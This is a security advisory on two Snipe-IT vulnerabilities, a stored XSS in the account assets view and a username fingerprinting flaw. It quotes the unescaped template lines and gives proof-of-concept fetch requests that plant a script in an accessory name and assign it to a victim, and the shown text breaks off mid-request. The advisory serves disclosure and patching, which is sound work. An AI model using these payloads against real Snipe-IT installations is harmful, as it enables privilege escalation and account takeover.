---
title: Multiple vulnerabilities in Snipe-IT
url: https://census-labs.com/news/2022/12/23/multiple-vulnerabilities-in-snipe-it/
source: CENSUS
date: 2022-12-24
fetch_date: 2025-10-04T02:28:18.840038
---

# Multiple vulnerabilities in Snipe-IT

[![CENSUS | Cybersecurity Engineering](/static/assets/img/logos/logo.png)](/)

[CONTACT](/contact)

* [BLOG](/news/category/blog/)
* [ADVISORIES](/news/category/advisories/)
* [CAREERS](/openings/)
* [INTERNSHIP](/internship/)

* [INDUSTRIES](/industries/)
* [CAPABILITIES](/capabilities/)
* [SOLUTIONS](/solutions/)
* [LABS](/labs/)
* [COMPANY](/census/)

POSTED BY:
[Charalampos Maraziaris](/cdn-cgi/l/email-protection#87e4eae6f5e6fdeee6f5eef4c7e4e2e9f4f2f4aaebe6e5f4a9e4e8ea)
/
23.12.2022

# Multiple vulnerabilities in Snipe-IT

|  |  |
| --- | --- |
| CENSUS ID: | CENSUS-2022-0002 |
| CVE IDs: | [CVE-2022-44380](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-44380), [CVE-2022-44381](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-44381) |
| Affected Products: | [Snipe-IT](https://snipeitapp.com/) versions prior to 6.0.14 |
| Class of CVE-2022-44380: | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) |
| Class of CVE-2022-44381: | Improper Access Control ([CWE-284](https://cwe.mitre.org/data/definitions/284.html)) |
| Discovered by: | Charalampos Maraziaris |

CENSUS identified Cross-Site Scripting (XSS) and username fingerprinting bugs in [Snipe-IT](https://github.com/snipe/snipe-it).
Snipe-IT is a free open source IT asset/license management system.
CENSUS has verified that [release 6.0.14](https://github.com/snipe/snipe-it/releases/tag/v6.0.14) of Snipe-IT carries appropriate fixes only for the identified Cross Site Scripting vulnerabilities.

## CVE-2022-44380 Vulnerability Details

A stored XSS vulnerability exists in the **"Account"** drop-down menu on the top-right of the app's UI (present in every page), when the user selects the **"View Assigned Assets"** options from the menu. A Stored XSS attack allows for adversaries to place malicious Javascript code into the database and have this Javascript code executed in a visitor's browser.

The loaded view (account/view-assets) renders Assets, Licences, Accessories and Consumables drawn from the database. The code responsible for presenting the database entries in the "account/view-assets" view (/resources/views/account/view-assets.blade.php) is presented below (release 6.0.12):

For Accessories: /resources/views/account/view-assets.blade.php

```

    550: <td>{!! $accessory->name !!}</td>
```

For Consumables: /resources/views/account/view-assets.blade.php

```

    598: <td>{!! $consumable->name !!}</td>
```

As shown above, the title is drawn from the database without using the double curly braces ({{ ... }}) that provide for HTML entity escaping in the Laravel Blade framework.
Instead, ({!! ... !!}) is used that does not escape content. Therefore it is possible for an attacker
to inject malicious Javascript in the Accessory and Consumable name field, and have this executed on a visitor's
browser.

The stored XSS attack can be performed by an adversary that has **Accessory.CREATE** permissions (to insert an Accessory title in the database) and **Accessory.CHECKOUT** permissions (to assign this Accessory to any user). The same attack targeting Consumables can be performed by an adversary possessing **Consumable.CREATE** and **Consumable.CHECKOUT** permissions.
Any user can be the victim of this attack as the malicious asset could be *assigned* to that user.
By targeting a Super User, an authenticated adversary can achieve privilege escalation, granting himself the Super User status.

As a proof of concept, the following payload creates a malicious **Accessory** entry:

```

await fetch("http://SNIPE-IT-DOMAIN/accessories", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------423391379527772494482286626525",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "http://SNIPE-IT-DOMAIN/accessories/create",
    "body": "
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"_token\"\r\n\r\VALID_CSRF_TOKEN\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"company_id\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"name\"\r\n\r\nabc <script> alert(1); </script>\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"category_id\"\r\n\r\nVALID_CATEGORY_ID\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"supplier_id\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"manufacturer_id\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"location_id\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"model_number\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"order_number\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"purchase_date\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"purchase_cost\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"qty\"\r\n\r\n9999\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"min_amt\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"notes\"\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525\r\n
    Content-Disposition: form-data;
    name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n
    -----------------------------423391379527772494482286626525--\r\n",
    "method": "POST",
    "mode": "cors"
});
```

To execute the above payload one needs to replace the VALID\_CSRF\_TOKEN and VALID\_CATEGORY\_ID with valid values.

The adversary can then use the following payload to assign the malicious Accessory to a victim user:

```

await fetch("http://SNIPE-IT-DOMAIN/accessories/ACCESSORY_ID/checkout", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "http://SNIPE-IT-DOMAIN/accessories/ACCESSORY_ID/checkout",
    "body": "_token=VALID_CSRF_TOKEN&assigned_to=VICTIM_US...